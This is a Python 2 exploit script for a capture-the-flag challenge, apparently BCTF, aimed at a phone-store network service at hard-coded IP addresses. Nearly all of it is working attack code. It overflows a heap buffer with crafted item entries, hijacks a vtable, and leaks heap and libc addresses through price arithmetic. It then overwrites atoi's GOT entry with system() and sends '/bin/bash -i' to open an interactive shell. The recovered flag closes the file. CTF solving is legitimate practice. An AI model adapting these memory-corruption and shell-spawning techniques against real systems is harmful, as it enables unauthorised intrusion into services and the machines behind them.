import sys
from socket import *
import ast
import re

TARGET = ('146.148.60.107', 6666)
#TARGET = ('128.2.172.202', 6666)

s = socket()
s.connect(TARGET)

def rd(*suffixes):
    out = ''
    while 1:
        x = s.recv(1)
        if not x:
            raise EOFError()
        sys.stdout.write(x)
        sys.stdout.flush()
        out += x

        for suffix in suffixes:
            if out.endswith(suffix):
                break
        else:
            continue
        break
    return out

def pr(x):
    s.send(x+'\n')
    print "<%s" % x

from struct import pack, unpack

store_name = 0x804b2c0
store_menu = 0x804b300
store_items = 0x804b340
bss_scratch = 0x804b400
phone_vtable = 0x8049B70
watch_vtable = 0x8049B60
sprintf_got = 0x804b00c
atoi_got = 0x804b038

sprintf_libc = 0x49d80
system_libc = 0x3ada0

# These are the parts we write with print_phone
l1 = len('Blackberry OS Phone ') # 20
lname = 0 # zeroed out by overflow
l2 = len(' price: -2147483648 CNY description: ') # 37
ldesc = 79
ltot = l1 + lname + l2 + ldesc

itemsize = 0x7c

# Part 1: Overflow the 2840-byte buffer by maxing out every entry.
# This results in up to 13 bytes of overwrite, which is enough to overwrite
# the malloc padding (4 bytes), malloc size field (4 bytes), and the first 4 bytes
# of the next allocated object.
rd('? ')
pr('a') # register
pr('A'*63)
# 14 normal entries
for i in xrange(14):
    pr('a') # sell phone
    pr('B'*31) # name
    pr('4') # type = Blackberry OS
    pr('-1147483648') # price
    pr('C'*79)
pr('c') # generate menu to allocate it
rd('Congraz!')

# Insert victim entry (this vtable will be overflown into)
# This entry is specially constructed. It will write the following string:
# "Blackberry OS Phone [NAME:31] price: -2147483648 CNY description: [DESC:79]"
# and we will use the name and desc fields to put specific values into memory.
name = ['\xdd']*31
desc = ['\xbb']*79
def write_at(addr, val):
    if '\x00' in val:
        raise ValueError("can't write null bytes")
    if '\n' in val:
        raise ValueError("can't write newlines")
    print addr
    n = len(val)
    if l1 <= addr <= l1 + lname - n:
        offs = addr - l1
        if name[offs:offs+len(val)] != ['\xdd']*n:
            raise ValueError("overlap")
        name[offs:offs+n] = val
    elif l1+lname+l2 <= addr <= ltot-n:
        offs = addr - (l1+lname+l2)
        if desc[offs:offs+n] != ['\xbb']*n:
            raise ValueError("overlap")
        desc[offs:offs+n] = val
    else:
        raise ValueError("write impossible")

# Construct a few special items.
# Item 1 will leak heap addresses because it overlaps the item table.
# Item 2 will leak libc addresses because it overlaps the GOT.
# Item 3 will recurse into main to reset the "registered" flag.
write1_end = store_items + 16
write1_start = write1_end - ltot
item1_start = store_items + 28 - itemsize
item2_start = sprintf_got - 0x74 # put sprintf got entry at price
item3_start = bss_scratch + 0x04
item4_start = store_name
write_at(store_items - write1_start, pack('<I', item1_start))
write_at(store_items + 4 - write1_start, pack('<I', item2_start))
write_at(store_items + 8 - write1_start, pack('<I', item3_start))
write_at(store_items + 12 - write1_start, pack('<I', item4_start))
write_at(store_name + 0x78 - write1_start, pack('<i', -1)) # type = -1, a null string
write_at(store_menu - write1_start + 1, pack('<I', bss_scratch + 0x120)[1:])

write2_start = bss_scratch - 0x60
write_at(item3_start - write2_start, pack('<I', 0x8048018)) # entry_point

name = ''.join(name)
desc = ''.join(desc)
print repr(name), repr(desc)
pr('a') # sell phone
pr(name) # name
pr('4') # type = Blackberry OS
pr('-1147483648') # price
pr(desc)

# Insert overflowing entry
pr('a') # sell phone
pr('B'*31) # name
pr('4') # type = Blackberry OS
pr('-1147483648') # price
pr('D'*74 + pack('<I', phone_vtable+4)) # overwrite victim item's vtable with [print_phone, 0]
pr('c') # generate menu, triggering the overwrite
rd('Congraz!')
rd('? ')
# Part 2: Use the corrupted vtable to do something useful. Here we're going to
# trigger print_phone a few times to write payloads across memory.
def pr(x):
    s.send(x+'\n')
    print "<%s" % x
    return rd('? ')

# Enrich ourselves by buying a regular item (worth -1 billion CNY)
pr('d') # return to main menu
pr('b') # try store
pr('2') # buy regular item
pr('a'); x = pr('1') # buy the item
money = int(re.findall(r'left: (\d+) CNY', x)[0])

pr('c') # return to main menu
pr('b') # try store
pr('15') # buy corrupt item
pr('b'); pr(str(write1_start)) # get wholesale price, triggering print_phone

pr('c') # return to main menu
pr('b') # try store
pr('15') # buy corrupt item
pr('b'); pr(str(write2_start)) # get wholesale price, triggering print_phone

pr('c') # return to main menu
pr('b') # try store
pr('1') # buy leaker item # 1
pr('a'); x = pr('1') # buy the item
newmoney = int(re.findall(r'left: (\d+) CNY', x)[0])

# Price is the address of item # 5
heapbase = ((money - newmoney) & 0xffffffff) - 0x208
print '<heap base = %08x>' % heapbase
money = newmoney

pr('c') # return to main menu
pr('b') # try store
pr('2') # buy leaker item # 2
pr('a'); x = pr('1') # buy the item
newmoney = int(re.findall(r'left: (\d+) CNY', x)[0])

# Price is the address of sprintf
libcbase = ((money - newmoney) & 0xffffffff) - sprintf_libc
print '<libc base = %08x>' % libcbase
money = newmoney

pr('c') # return to main menu
pr('b') # try store
pr('3') # buy restarter item #3
pr('b'); pr('10') # get wholesale price, triggering "restart"

# Now we can write anything we want to the store name
pr('a')
name = pack('<III',
    libcbase + system_libc, # atoi
    0, # _Zwnj
    libcbase + 0xd9960, # close
)
desc = ''

pr(pack('<I', watch_vtable+4) + name.ljust(32, '\0') + desc.ljust(27, '\0'))

pr('d') # return to main menu
pr('b') # try store
pr('4') # buy corrupt item
pr('b'); pr(str(atoi_got - 1)) # get wholesale price, triggering print_watch

def pr(x):
    s.send(x+'\n')
    print "<%s" % x

# Finally, trigger system() by 
pr('c') # return to main menu
pr('b') # try store
pr('/bin/bash -i') # trigger system()

s.settimeout(0.3)
while 1:
    while 1:
        try:
            bit = s.recv(4096)
            sys.stdout.write(bit)
        except timeout:
            break

    pr(raw_input()+'\n')

# flag = BCTF{h0w_could_you_byp4ss_vt4ble_read0nly_ch3cks}
